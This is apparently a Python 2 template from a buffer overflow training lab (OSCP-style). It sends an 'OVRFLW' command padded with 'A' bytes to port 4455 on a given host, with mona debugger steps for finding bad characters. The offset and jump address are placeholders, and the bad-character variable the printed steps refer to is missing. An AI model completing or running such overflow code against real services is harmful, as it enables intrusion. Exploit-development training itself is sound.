#!/usr/bin/python

import sys, socket

reminder = raw_input ("Run -> !mona bytearray -b <badcharlist>")

if len(sys.argv) < 2:
    print "\nUsage: " +sys.argv[0] + " <HOST>\n"
    sys.exit()

#Badchar list (add to here as we find them)
# \x00\

jmp = " "

cmd = "OVRFLW "
junk = "A" * <offset> + jmp
end = "\r\n"

buffer = cmd + junk + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close

print "Run -> !mona compare -f C:\\mona\\oscp\\bytearray.bin -a <ESP address> "
print "Delete badchars from badchars variable and append to the commented badchar list"
print "Reset debugger and re-run module until all the chars in the list are unmodified"
